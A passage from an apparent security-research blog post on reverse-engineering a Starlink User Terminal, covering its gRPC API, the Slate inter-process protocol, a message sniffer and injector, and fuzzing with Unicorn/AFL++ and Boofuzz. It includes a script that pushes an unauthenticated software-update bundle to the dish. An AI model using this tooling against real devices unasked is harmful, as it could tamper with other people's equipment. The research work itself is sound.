<span>the</span><span> </span><span>output</span><span> </span><span>of</span><span> </span><span>the</span><span> </span><span>binaries</span><span>,</span><span> </span><span>you</span><span> </span><span>can</span><span> </span><span>use</span><span>:</span><span></span>

<span>tail</span><span> </span><span>-</span><span>f</span><span> </span><span>/</span><span>var</span><span>/</span><span>log</span><span>/</span><span>messages</span><span></span>

<span>Or</span><span> </span><span>view</span><span> </span><span>the</span><span> </span><span>viceroy</span><span> </span><span>telemetry</span><span> </span><span>stream</span><span>.</span><span></span>

<span>[</span><span>root</span><span>@</span><span>user1</span><span> </span><span>~</span><span>]</span><span>#</span><span></span>
</code></pre></div>

<p>All the scripts and files presented above are available <a href="https://github.com/quarkslab/starlink-tools/tree/main/emulator">here</a>, but we won't publish the whole UT's firmware, so you'll still have to extract it yourself to run the emulator.</p>
<h2><a name="communications"></a>Communications</h2>
<p>In IoT devices, communication with other devices is often a crucial function, if not the main one.
This is also the case for our device, which is basically an internet gateway and, as you can imagine, in this case, communication between the device and the satellites is the main function of the User Terminal.
We briefly analyzed the physical layer of this communication, but we didn't focus on it.
On a higher layer, the communication with satellites is split into two "planes":</p>
<ul>
<li>The Data Plane, which contains user traffic to and from the Internet.</li>
<li>The Control Plane, which contains every other kind of traffic, such as control messages between the antenna and the satellite (e.g. Connection handshake).</li>
</ul>
<p>But these are not the only communications happening in the device, in the following sections we will also see how the device interacts with user front-end applications and also how the different components inside the device communicate with each other.</p>
<h3>Front-end applications</h3>
<p>The communication with front-end applications is handled by the process <code>user_terminal_frontend</code>, which we were able to both run in the emulated environment and reverse-engineer, thanks to the language it has been implemented in (Go).
From the front-end applications, the user can see some statistics of the device and can change some high-level settings such as Wi-Fi credentials, reboot or stow the dish, etc.
These interactions use gRPC (Google's Remote Procedure Calls), which in turn uses <code>protobuf</code> underneath.
Protobuf definitions can be gathered either by extracting them from the binary (using <code>pbtk</code>) or by asking the reflection server of the process itself (using <code>grpcurl</code>, for example).
<a href="https://github.com/sparky8512/starlink-grpc-tools">Some</a> <a href="https://github.com/starlink-community/starlink-cli">tools</a> have been implemented as alternative front-end applications that use this protocol.
The aforementioned applications, implemented in Python, use the gRPC APIs exposed by the frontend binary, providing the user with an alternative user interface to inspect the statistics of the dish.
The authors of these applications probably gathered the protocol definitions from the mobile application or by using the reflection server.</p>
<p>In the following code snippet, you can see the (partial) definition of the <code>Request</code> message, which contains a few ids and one specific request, among the ones listed.
Every inner request has its definition, with the parameters the server needs to process the request, and a corresponding response that will hold the result.</p>
<div><pre><span></span><code><span>message</span><span> </span><span>Request</span><span> </span><span>{</span>
<span>    </span><span>uint64</span><span> </span><span>id</span><span> </span><span>=</span><span> </span><span>1</span><span>;</span>
<span>    </span><span>uint64</span><span> </span><span>epoch_id</span><span> </span><span>=</span><span> </span><span>14</span><span>;</span>
<span>    </span><span>string</span><span> </span><span>target_id</span><span> </span><span>=</span><span> </span><span>13</span><span>;</span>

<span>    </span><span>oneof</span><span> </span><span>request</span><span> </span><span>{</span>
<span>        </span><span>GetNextIdRequest</span><span> </span><span>get_next_id</span><span> </span><span>=</span><span> </span><span>1006</span><span>;</span>
<span>        </span><span>AuthenticateRequest</span><span> </span><span>authenticate</span><span> </span><span>=</span><span> </span><span>1005</span><span>;</span>
<span>        </span><span>EnableDebugTelemRequest</span><span> </span><span>enable_debug_telem</span><span> </span><span>=</span><span> </span><span>1034</span><span>;</span>
<span>        </span><span>FactoryResetRequest</span><span> </span><span>factory_reset</span><span> </span><span>=</span><span> </span><span>1011</span><span>;</span>
<span>        </span><span>GetDeviceInfoRequest</span><span> </span><span>get_device_info</span><span> </span><span>=</span><span> </span><span>1008</span><span>;</span>
<span>        </span><span>GetHistoryRequest</span><span> </span><span>get_history</span><span> </span><span>=</span><span> </span><span>1007</span><span>;</span>
<span>        </span><span>GetLogRequest</span><span> </span><span>get_log</span><span> </span><span>=</span><span> </span><span>1012</span><span>;</span>
<span>        </span><span>GetNetworkInterfacesRequest</span><span> </span><span>get_network_interfaces</span><span> </span><span>=</span><span> </span><span>1015</span><span>;</span>
<span>        </span><span>GetPingRequest</span><span> </span><span>get_ping</span><span> </span><span>=</span><span> </span><span>1009</span><span>;</span>
<span>        </span><span>PingHostRequest</span><span> </span><span>ping_host</span><span> </span><span>=</span><span> </span><span>1016</span><span>;</span>
<span>        </span><span>GetStatusRequest</span><span> </span><span>get_status</span><span> </span><span>=</span><span> </span><span>1004</span><span>;</span>
<span>        </span><span>RebootRequest</span><span> </span><span>reboot</span><span> </span><span>=</span><span> </span><span>1001</span><span>;</span>
<span>        </span><span>SetSkuRequest</span><span> </span><span>set_sku</span><span> </span><span>=</span><span> </span><span>1013</span><span>;</span>
<span>        </span><span>SetTrustedKeysRequest</span><span> </span><span>set_trusted_keys</span><span> </span><span>=</span><span> </span><span>1010</span><span>;</span>
<span>        </span><span>SpeedTestRequest</span><span> </span><span>speed_test</span><span> </span><span>=</span><span> </span><span>1003</span><span>;</span>
<span>        </span><span>SoftwareUpdateRequest</span><span> </span><span>software_update</span><span> </span><span>=</span><span> </span><span>1033</span><span>;</span>
<span>        </span><span>DishStowRequest</span><span> </span><span>dish_stow</span><span> </span><span>=</span><span> </span><span>2002</span><span>;</span>
<span>        </span><span>StartDishSelfTestRequest</span><span> </span><span>start_dish_self_test</span><span> </span><span>=</span><span> </span><span>2012</span><span>;</span>
<span>        </span><span>DishGetContextRequest</span><span> </span><span>dish_get_context</span><span> </span><span>=</span><span> </span><span>2003</span><span>;</span>
<span>        </span><span>DishGetObstructionMapRequest</span><span> </span><span>dish_get_obstruction_map</span><span> </span><span>=</span><span> </span><span>2008</span><span>;</span>
<span>        </span><span>DishSetEmcRequest</span><span> </span><span>dish_set_emc</span><span> </span><span>=</span><span> </span><span>2007</span><span>;</span>
<span>        </span><span>DishGetEmcRequest</span><span> </span><span>dish_get_emc</span><span> </span><span>=</span><span> </span><span>2009</span><span>;</span>
<span>        </span><span>DishSetConfigRequest</span><span> </span><span>dish_set_config</span><span> </span><span>=</span><span> </span><span>2010</span><span>;</span>
<span>        </span><span>DishGetConfigRequest</span><span> </span><span>dish_get_config</span><span> </span><span>=</span><span> </span><span>2011</span><span>;</span>
<span>        </span><span>// [...]</span>
<span>    </span><span>}</span>
<span>}</span>
</code></pre></div>

<p>There are two ways to communicate with this gRPC, either by using an insecure channel or by using a secure channel, which involves TLS and mutual authentication using certificates stored in the secure element.
The mobile application and the web interface both use the insecure channel, so the encrypted one must be used by something else.</p>
<p>Among the requests that can be made to the server, many of them are meant for front-end applications, a few examples are:</p>
<ul>
<li><code>FactoryResetRequest</code>, which requests a factory reset of the dish.</li>
<li><code>GetDeviceInfoRequest</code>, which returns some information about the device.</li>
<li><code>GetStatusRequest</code>, which requests the status of the dish.</li>
<li><code>RebootRequest</code>, which asks the dish to reboot.</li>
</ul>
<p>But some requests do not look like they are used by those applications, such as:</p>
<ul>
<li><code>SetTrustedKeysRequest</code>, which supposedly sets the provided public keys for future use by the process or by the SSH agent.</li>
</ul>
<div><pre><span></span><code><span>message</span><span> </span><span>SetTrustedKeysRequest</span><span> </span><span>{</span>
<span>    </span><span>repeated</span><span> </span><span>PublicKey</span><span> </span><span>keys</span><span> </span><span>=</span><span> </span><span>1</span><span>;</span>
<span>}</span>
</code></pre></div>

<ul>
<li><code>GetHeapDumpRequest</code>, which supposedly returns a dump of the Heap section of the process.</li>
<li><code>SoftwareUpdateRequest</code>, which supposedly initiates a software update with the provided update bundle.</li>
</ul>
<p>Unfortunately, most of these requests are not implemented in the binary we were analyzing (e.g. <code>SetTrustedKeysRequest</code>, <code>GetHeapDumpRequest</code>), and some of them require authentication (e.g. <code>DishGetContextRequest</code>, <code>DishGetEmcRequest</code>) both on the transport layer (secure gRPC channel) and application layer (by using the <code>AuthenticateRequest</code>).
We are not entirely sure who is supposed to use these requests and why most of them are not implemented in the binary, they could be used by another Stalink product such as the Wi-Fi router, or by Starlink support in the case of a partially bricked device, for remote assistance.
The most interesting request that is both implemented and does not require authentication is the <code>SoftwareUpdateRequest</code>, which will be explained better in Section <a href="#fuzzing">Fuzzing</a>.</p>
<p>Further work on this topic would be to analyze further every request handler for bugs or, better to fuzz them since there exist effective mutators for the protobuf protocol, such as <code>libprotobuf-mutator</code>.</p>
<h3>Inter-Process Communication</h3>
<p>Every process running in the runtime continuously shares information with other processes, to collaborate and share statistics.
As you can see from the figure showing the runtime architecture, every process only communicates with the User Terminal Control, which acts as an orchestrator for the whole runtime.
The protocol they are using is designed by SpaceX and it's called <code>Slate Sharing</code>.</p>
<p>It uses UDP for transport, and every process starts listening on a different port, on the loopback interface and will receive messages from the control process on that port.
On the other hand, the control process starts listening on multiple ports, one for every process that needs to communicate with it, so that the communication is bidirectional and without conflicts between processes.
Port numbers are configured through a configuration file that can be found at <code>/sx/local/runtime/common/service_directory</code>, in the following snippet, you can see a part of it, which lists the port numbers for communications between software update and control, and between frontend and control.</p>
<div><pre><span></span><code><span>################################################################################</span>
<span># Software update</span>
software_update_to_control                localhost   <span>27012</span>       udp_proto
control_to_software_update                localhost   <span>27013</span>       udp_proto

<span>################################################################################</span>
<span># Frontend</span>
control_to_frontend                       localhost   <span>6500</span>        udp_proto
frontend_to_control                       localhost   <span>6501</span>        udp_proto
</code></pre></div>

<p>Every couple of processes exchange different kinds of data, and messages do not contain any information about the content nor the structure of the data they transport, unlike other protocols such as JSON or XML.
Thus, to understand the content of messages we had to reverse engineer one of the binaries that makes use of the protocol, and in our case, the best choice was once again the user terminal frontend, which is the one implemented in Go.</p>
<p>Data is exchanged in binary form, by sending raw packed (no padding) C structures, in big-endian.
Every message contains a header, holding some information about the message, and a body, containing the actual data to be shared.
In the following snippet, you can see the data structure representing the message header, from the GolangAnalyzer Ghidra plugin.
With the same technique, we also extracted the structure of the body of messages between the frontend process and control.</p>
<div><pre><span></span><code>**************************************************************
* Name: sx_slate.SlateHeader                                 *
* Struct:                                                    *
*   +   0x0    0x4 uint BwpType                              *
*   +   0x4    0x4 uint Crc                                  *
*   +   0x8    0x8 longlong Seq                              *
*   +  0x10    0x4 uint Frame                                *
**************************************************************    
</code></pre></div>

<p>The header contains:</p>
<ul>
<li><code>BwpType</code>, which is a fixed value, acts as a "magic number" for the protocol (<code>00 00 01 20</code>).</li>
<li><code>Crc</code>, whose name suggests it is a Cyclic Redundancy Check, so a sort of error-detecting code for the message body, but by reverse engineering and sniffing messages, this field seems to be fixed as well, but it is different for every couple of messages.</li>
<li><code>Seq</code>, which is a sequence number that is incremented every message, but the protocol does not include any acknowledgment mechanisms to resend lost messages.</li>
<li><code>Frame</code>, which is used in case of fragmentation, i.e. when the message is bigger than the MTU (Maximum Transmission Unit), which is usually set to 1500 bytes. In this case, the body of the message is split into multiple frames, each one having an identical header, apart from the <code>Frame</code> field, which is incremented each frame, starting from 0.</li>
</ul>
<p>The body of the message is encoded in the same way, as an example, in the following snippet, you can see part of the structure of messages sent by the frontend process to control.</p>
<div><pre><span></span><code>**************************************************************
* Name: slate.FrontendToControl                              *
* Struct:                                                    *
*   +   0x0    0x1 bool AppReboot                            *
*   +   0x1    0x1 bool TiltToStowed                         *
*   +   0x4    0x4 uint StartDishCableTestRequests           *
*   +   0x8    0x1 bool IfLoopbackTest                       *
*   +  0x10    0x8 longlong Now                              *
*   +  0x18    0x8 longlong StarlinkWifiLastConnected        *
[...]    
</code></pre></div>

<p>Thanks to this information we would already be able to implement a message decoder (which we did), but this would only work for the communication between the frontend process and control. To decode other communications we would need to manually reverse engineer every other binary to find out the structure of messages, perhaps without even finding field names, but as explained in previous sections, it was hard to get useful information from C++ binaries.
Here you can see how we parse the header of Slate messages in Python, using the <code>ctypes</code> package.</p>
<div><pre><span></span><code><span>class</span> <span>SlateHeader</span><span>(</span><span>BigEndianStructure</span><span>):</span>
    <span>_pack_</span> <span>=</span> <span>1</span>
    <span>_fields_</span> <span>=</span> <span>[</span>
        <span>(</span><span>'BwpType'</span><span>,</span> <span>c_uint32</span><span>),</span>
        <span>(</span><span>'Crc'</span><span>,</span> <span>c_uint32</span><span>),</span>
        <span>(</span><span>'Seq'</span><span>,</span> <span>c_longlong</span><span>),</span>
        <span>(</span><span>'Frame'</span><span>,</span> <span>c_uint32</span><span>)</span>
    <span>]</span>
</code></pre></div>

<p>Then, to understand how the protocol is handled in C++ binaries, we looked for some fields of the structures we knew (the ones of the frontend process) in the control process, which should have them in order to decode those incoming messages.
We couldn't find them in the binary, but we found something way better, in the folder <code>/sx/local/runtime/common</code> there is a set of configuration files, such as <code>frontend_to_control</code>, which contain the structure of every message exchanged by processes.
Here is a snippet containing part of the aforementioned configuration file.</p>
<div><pre><span></span><code># Slate share message from gRPC frontend process to main control process.
app_reboot                          bool
tilt_to_stowed                      bool
start_dish_cable_test_requests      uint32
if_loopback_test.enabled            bool
now                                 int64
starlink_wifi_last_connected        int64
# [...]
</code></pre></div>

<p>With this, it is much easier to implement a more generic decoder that parses these protocol definitions and decodes messages accordingly.
Such a tool has been developed and will be discussed in the next section.</p>
<h3>Slate sniffer &amp; injector</h3>
<p>Slate messages are sent very fast, thus it is hard to understand what is happening without a proper visualization tool.
That is why we've implemented the <a href="https://github.com/quarkslab/starlink-tools/tree/main/slate-sniffer">Slate sniffer</a>, a tool that sniffs UDP packets on the loopback interface and decodes them on the fly, highlighting differences between consecutive messages.
In the following figure, you can see the overall architecture of the new tool, which we'll describe in more detail.
This tool was implemented for the emulated environment but we designed it keeping in mind that it would need to work also on the real dish.
For this reason, most of the work is done in the Sniffer, which is not in the device, and all the communications between the sniffer and the dish happen through SSH.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-sniffer.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-sniffer.png" width="80%">
    </a>
</center>
<p>The first component that is used when starting the sniffer, is the protocol definition parser, which will parse configuration files:</p>
<ul>
<li><code>service_directory</code> to know which "services" (i.e. message definitions) are available and on which UDP ports they will communicate.</li>
<li><code>[P1]_to_[P2]</code> for every available couple of processes <code>P1</code> and <code>P2</code>, to know the format of messages that will be exchanged.</li>
</ul>
<p>This component will create <code>SlateMessageParser</code> objects, that will later be used to decode messages.
The decoding is made using the <code>struct</code> python package.</p>
<p>After this, <a href="https://www.tcpdump.org/"><code>TCPdump</code></a> will be launched on the dish, through SSH, and will listen on the loopback interface, only capturing UDP packets that have as the destination port one of the ones found by the parser.
The output of <a href="https://www.tcpdump.org/"><code>TCPdump</code></a> is piped to <a href="https://scapy.net/"><code>Scapy</code></a> which will decode the packet, understand which service it comes from, by reading the destination port, and will then extract the UDP payload and pass it to the message decoder.
When a message is parsed correctly, it will be stored in the Storage component, which in this case is a simple in-memory database, only holding recent messages (configurable, based on available memory).
On top of all this, there is a Flask server, exposing some APIs, to know which services are available, to know the schema of a message and, of course, to fetch messages.
We also implemented a front end, as a simple web interface, which is shown in the following picture.
From the current front end, it is possible to see messages in real-time, spotting differences thanks to the highlighted changes, selecting which fields to show and filtering or ordering them.
The frontend module is easily replaceable thanks to the exposed APIs, thus more complex interfaces can be integrated into the sniffer, to inspect the acquired data in more ways.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-sniffer-screen.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-sniffer-screen.png" width="80%">
    </a>
</center>
<p>After having a way to see messages, we thought it would be interesting to be able to inject custom messages, by editing the ones we are receiving or by creating new ones from scratch.
For this reason, we implemented the Slate injector, which shares most of the codebase with the sniffer.
The architecture of this tool is shown below.
Messages, to be received by processes, need to come from the loopback interface, thus we cannot send them directly from the Injector (which is external to the device).
This is why the injector will start a <code>socat</code> server on the dish, which will listen for UDP messages on the "external" network interface, and will then forward them to the right UDP port, by changing the source address to localhost.
Some API endpoints have been implemented to be able to inject messages from the front end and the current interface lets you edit and send a message or create a new one.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-injector.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-injector.png" width="80%">
    </a>
</center>
<p>Being able to inspect messages between processes helped us a lot in understanding what each process does without being able to fully reverse-engineer them.
Additionally, having the protocol definition and an easy way to inject messages, a natural development of the project is to fuzz the protocol, which will be tackled in Section <a href="#fuzzing">fuzzing</a>.
The full code of the Slate sniffer, injector and fuzzer can be found <a href="https://github.com/quarkslab/starlink-tools/tree/main/slate-sniffer">here</a>, but again without the protocol definitions, which you'll have to extract from the dish.</p>
<h2><a name="fuzzing"></a>Fuzzing</h2>
<p>In the last part of my internship at Quarkslab, we identified which parts of the software had been analyzed enough to be suitable for fuzz testing.
To find a good fuzzable target, we had to take into account multiple aspects:</p>
<ul>
<li>The possible attack vector in the case a bug was found:<ul>
<li>Can the bug be triggered by an authenticated user?</li>
<li>Does the attacker need to be connected to the Wi-Fi network of the dish?</li>
<li>Can the bug be triggered directly from the Internet?</li>
<li>Does the attacker need to already have access to the dish? In this case, the bug could be used for lateral movement inside the dish or privilege escalation.</li>
</ul>
</li>
<li>What is the impact of a possible bug in the target?</li>
<li>How easily fuzzable is the target, and which kind of fuzzing is the most suitable for the target:<ul>
<li>How is the input provided?</li>
<li>Can the target program run isolated? If a program makes use of many hardware peripherals and/or interacts with other components of the runtime, it will be hard to fuzz it in an isolated environment.</li>
<li>How deeply have we analyzed the target to know its internal workings?</li>
</ul>
</li>
</ul>
<h3>sxverity</h3>
<p>As we saw in the communication section,  it is possible to trigger a software update by sending a <code>SoftwareUpdateRequest</code> to the frontend process from the internal network.
This is an interesting request because it is the only one that does not look like it is meant for the user and does not require authentication.
Furthermore, the input of this request is the update bundle, which can be very big, while inputs for other requests are often empty or very simple.
The update bundle has to be split in chunks before being sent to the dish, here is a python script that sends this message.</p>
<div><pre><span></span><code><span>CHUNK_SIZE</span> <span>=</span> <span>16384</span>

<span>def</span> <span>update</span><span>(</span><span>data</span><span>):</span>
    <span>channel</span> <span>=</span> <span>grpc</span><span>.</span><span>insecure_channel</span><span>(</span><span>'192.168.100.1:9200'</span><span>)</span>
    <span>stub</span> <span>=</span> <span>device_pb2_grpc</span><span>.</span><span>DeviceStub</span><span>(</span><span>channel</span><span>)</span>

    <span>stream_id</span> <span>=</span> <span>int</span><span>.</span><span>from_bytes</span><span>(</span><span>os</span><span>.</span><span>urandom</span><span>(</span><span>4</span><span>),</span> <span>byteorder</span><span>=</span><span>'little'</span><span>)</span>

    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span> <span>len</span><span>(</span><span>data</span><span>),</span> <span>CHUNK_SIZE</span><span>):</span>
        <span>chunk</span> <span>=</span> <span>data</span><span>[</span><span>i</span><span>:</span><span>min</span><span>(</span><span>len</span><span>(</span><span>data</span><span>),</span> <span>i</span> <span>+</span> <span>CHUNK_SIZE</span><span>)]</span>
        <span>request</span> <span>=</span> <span>device_pb2</span><span>.</span><span>Request</span><span>(</span><span>id</span> <span>=</span> <span>1</span><span>,</span> <span>epoch_id</span> <span>=</span> <span>1</span><span>,</span> <span>target_id</span> <span>=</span> <span>"unknown"</span><span>,</span>
            <span>software_update</span> <span>=</span> <span>common_pb2</span><span>.</span><span>SoftwareUpdateRequest</span><span>(</span>
                <span>stream_id</span> <span>=</span> <span>stream_id</span><span>,</span>
                <span>data</span> <span>=</span> <span>chunk</span><span>,</span>
                <span>open</span> <span>=</span> <span>i</span> <span>==</span> <span>0</span><span>,</span>
                <span>close</span> <span>=</span> <span>i</span> <span>+</span> <span>CHUNK_SIZE</span> <span>&gt;=</span> <span>len</span><span>(</span><span>data</span><span>)</span>
            <span>)</span>
        <span>)</span>
</code></pre></div>

<p>Every message needs to have the same <code>stream_id</code>, which can be randomly generated, then the first message has the <code>open</code> flag, while the last one has the <code>close</code> flag and all the ones in between don't have any of them.
The receiver of the message is the frontend process, which will save the update bundle in a temporary folder, without reading the content of it, so without performing any kind of input sanitization, it will just check that the size of the bundle does not reach a hardcoded threshold.
After that, the frontend process will notify the control process that a sideload update is ready to be applied, through a Slate message, and the control process will do the same for the software update process.
Once the latter receives the message, the update is ready to be started, the figure below shows the overall flow of messages and actions the <code>SoftwareUpdateRequest</code> triggers.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/sideload.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/sideload.png" width="60%">
    </a>
</center>
<p>After the software update process is notified that a software update bundle is ready to be applied, the update procedure starts.
From this moment, there is no difference between this kind of software update and the standard one, which is downloading the update bundle from Starlink's backend.
The update bundle is a <code>sxverity</code> image, which will be verified by the program with the same name and the inner <code>rom1fs</code> filesystem will be mounted.
Once mounted, the software update process will look for partition images in the mount point.
Every partition image will also have a SHA512 hashsum for additional integrity verification.
Finally, each available partition image will be flashed on the corresponding <code>/dev/blk/other/*</code> eMMC logical partition.</p>
<p>The update bundle is not accessed directly by the software update process, so the first process actually reading the content of the provided input is <code>sxverity</code>. Thus any fuzz test can be performed directly on that binary, skipping all previous steps.
In the following figure, you can see how the verification process is performed by <code>sxverity</code>.
The fuzzable code is very limited because the signature verification is made by a library, which is out of scope, and anything happening after a successful signature verification is to be considered unreachable for us because if we can reach that state, it means we were able to craft an update package that would be flashed so we don't need to find other bugs there.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/sxverity.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/sxverity.png" width="80%">
    </a>
</center>
<p>The only part of the input that will be parsed by the code under test is the header of the image, thus that will be the only part of the input that the fuzzer will mutate.
Since that part of the program can be executed completely in complete isolation, we've fuzzed it inside <a href="https://www.unicorn-engine.org/"><code>unicorn</code></a>, a lightweight CPU emulator that can be instructed from Python, by using its bindings.
The first step was being able to emulate the code we want to test and setting up the harness for our fuzzer, which includes:</p>
<ul>
<li>Loading the binary.</li>
<li>Identifying a good starting point in the code, in which it is easy to set up the whole environment, such as placing the input in the right memory location and setting up every other memory structure that will be used by the code under testing.
  As an example, the following snippet shows how the input is placed in memory and how registers holding the addresses to the input locations are set.</li>
</ul>
<div><pre><span></span><code><span>def</span> <span>place_input_cb</span><span>(</span><span>mu</span><span>:</span> <span>Uc</span><span>,</span> <span>content</span><span>:</span> <span>bytes</span><span>,</span> <span>persistent_round</span><span>,</span> <span>data</span><span>):</span>
    <span>content_size</span> <span>=</span> <span>len</span><span>(</span><span>content</span><span>)</span>

    <span>if</span> <span>content_size</span> <span>&lt;</span> <span>INPUT_MIN_LEN</span><span>:</span>
        <span>return</span> <span>False</span>

    <span>pubkey</span><span>,</span> <span>header</span> <span>=</span> <span>key_and_header_from_data</span><span>(</span><span>content</span><span>)</span>

    <span># write data in memory</span>
    <span>mu</span><span>.</span><span>mem_write</span><span>(</span><span>PUBKEY_ADDR</span><span>,</span> <span>pubkey</span><span>)</span>
    <span>mu</span><span>.</span><span>mem_write</span><span>(</span><span>HEADER_ADDR</span><span>,</span> <span>header</span><span>)</span>

    <span># prepare function arguments</span>
    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_X2</span><span>,</span> <span>PUBKEY_ADDR</span><span>)</span> <span># pubkey address</span>
    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_X3</span><span>,</span> <span>0x40</span><span>)</span> <span># nblocks</span>
    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_X4</span><span>,</span> <span>HEADER_ADDR</span><span>)</span> <span># header buffer address</span>

    <span>return</span> <span>True</span>
</code></pre></div>

<ul>
<li>Identifying function calls, hooking them and emulating them in Python, so that we do not spend time testing library code, nor do we have to load them in memory and handle dynamically loaded libraries.
  As an example, here is how the libc function <code>memcpy</code> is hooked and emulated.</li>
</ul>
<div><pre><span></span><code><span>if</span> <span>address</span> <span>==</span> <span>MEMCPY_ADDR</span><span>:</span>
    <span># read arguments from registers</span>
    <span>dest</span> <span>=</span> <span>mu</span><span>.</span><span>reg_read</span><span>(</span><span>UC_ARM64_REG_X0</span><span>)</span>
    <span>src</span> <span>=</span> <span>mu</span><span>.</span><span>reg_read</span><span>(</span><span>UC_ARM64_REG_X1</span><span>)</span>
    <span>n</span> <span>=</span> <span>mu</span><span>.</span><span>reg_read</span><span>(</span><span>UC_ARM64_REG_X2</span><span>)</span>

    <span># read the data from src</span>
    <span>data</span> <span>=</span> <span>mu</span><span>.</span><span>mem_read</span><span>(</span><span>src</span><span>,</span> <span>n</span><span>)</span>
    <span># write data in dst</span>
    <span>mu</span><span>.</span><span>mem_write</span><span>(</span><span>dest</span><span>,</span> <span>bytes</span><span>(</span><span>data</span><span>))</span>
    <span># return the address of dest </span>
    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_X0</span><span>,</span> <span>dest</span><span>)</span>
    <span># jump to the return address</span>
    <span>lr</span> <span>=</span> <span>mu</span><span>.</span><span>reg_read</span><span>(</span><span>UC_ARM64_REG_LR</span><span>)</span>
    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_PC</span><span>,</span> <span>lr</span><span>)</span>
</code></pre></div>

<ul>
<li>Identifying an ending point, which has to be a point in the program in which we stop the emulation because the run was successful (no bugs).</li>
</ul>
<p>The nicest thing about using Unicorn, other than being pretty easy to configure and instruct, is the flawless support with <a href="https://aflplus.plus/"><strong>AFL++</strong></a> (American Fuzzy Lop plus plus) which we used as fuzzer.
AFL++ working with Unicorn can detect crashes and most importantly, gather coverage information, in a transparent manner, so that it can perform coverage-guided mutations and setting up the fuzzer with Unicorn is pretty straightforward.
The fuzzer also needs some initial test cases, called seeds, for that we've used some valid headers, taken from sxverity images found in the dish, and some randomly generated headers.</p>
<p>The fuzzer ran for around 24 hours, performing more than one million executions, but unfortunately, no crash was recorded.
This was expected since the tested codebase was very limited and the structure of the input was very simple, not having complex data structures or variable length fields, the most common memory-related bugs are avoided.</p>
<h3>Slate messages</h3>
<p>The other component we tested with fuzzing was Inter-Process Communication (IPC) - which was deeply analyzed in the previous section - since we already had developed a set of tools to analyze and tamper with this communication.
In this case, we are not going to fuzz a single binary, but rather the whole set of processes that form the runtime of the device, since every one of them is using Slate messages to communicate.
The fuzzing approach was completely different from the one we used for sxverity, which was gray-box fuzzing, because:</p>
<ul>
<li>The codebase we are trying to test is enormous.</li>
<li>We weren't able to exactly identify the code that handles slate messages in every binary and, more importantly, bugs can be also found outside this code, because of some inconsistencies in the program state caused by wrongly interpreted inputs.</li>
<li>Binaries need to run in a dish-like environment because they continuously interact with other components of the system, most of them don't even run in our emulated environment.</li>
<li>Also recording coverage would have been challenging, because for that we need to instrument the binaries since we don't have the source code to recompile them, and the fuzzer would need to be run on the dish.</li>
</ul>
<p>For the above reasons, we used black-box fuzzing, without coverage-guided mutations, which is usually called "dumb" fuzzing.
<a href="https://github.com/jtpereyda/boofuzz">Boofuzz</a> was used as fuzzer, it is a simple and easy-to-use fuzzer specifically designed for network protocols, which was a perfect fit for what we were looking for.
Boofuzz does not generate input in a completely random way because you are giving it the protocol definition to be used in the communication, with the possibility of defining sequences of messages using a finite state machine.
In our case, every message was disconnected from the others (apart from the sequence number), so defining the format of messages was enough.
The fuzzer will then mutate every field of the message, by trying some values that could trigger a bug, e.g. for an <code>int32</code> the fuzzer will try values such as <code>{0, 1, -1, INT_MAX, -INT_MAX, ...}</code>.
As an example, here is how some fields of Slate messages are "translated" to Boofuzz protocol definition.</p>
<div><pre><span></span><code><span>if</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"BOOL"</span><span>:</span>
    <span>return</span> <span>Simple</span><span>(</span>
        <span>name</span><span>=</span><span>param</span><span>.</span><span>name</span><span>,</span>
        <span>default_value</span><span>=</span><span>b</span><span>"</span><span>\x00\x00\x00\x00</span><span>"</span><span>,</span>
        <span>fuzz_values</span><span>=</span><span>[</span><span>b</span><span>"</span><span>\x00\x00\x00\x00</span><span>"</span><span>,</span> <span>b</span><span>"</span><span>\x00\x00\x00\x01</span><span>"</span><span>],</span>
    <span>)</span>
<span>if</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"INT8"</span> <span>or</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"UINT8"</span><span>:</span>
    <span>return</span> <span>Byte</span><span>(</span><span>name</span><span>=</span><span>param</span><span>.</span><span>name</span><span>)</span>
<span>if</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"INT32"</span> <span>or</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"UINT32"</span> <span>or</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"FLOAT"</span><span>:</span>
    <span>return</span> <span>DWord</span><span>(</span><span>name</span><span>=</span><span>param</span><span>.</span><span>name</span><span>)</span>
</code></pre></div>

<p>Every data type used in the Slate message protocol could be encoded using Boofuzz's standard types, apart from the Sequence number, which needs to store an internal state to increment itself every iteration, you can see its implementation in the following snippet.
Static fields such as the <code>Bwptype</code> and <code>Crc</code> can be encoded using the <code>Static</code> type from Boofuzz.</p>
<div><pre><span></span><code><span>class</span> <span>SequenceNumber</span><span>(</span><span>Fuzzable</span><span>):</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>*</span><span>args</span><span>,</span> <span>**</span><span>kwargs</span><span>):</span>
        <span>super</span><span>()</span><span>.</span><span>__init__</span><span>(</span><span>*</span><span>args</span><span>,</span> <span>**</span><span>kwargs</span><span>,</span> <span>fuzzable</span><span>=</span><span>False</span><span>,</span> <span>default_value</span><span>=</span><span>0</span><span>)</span>
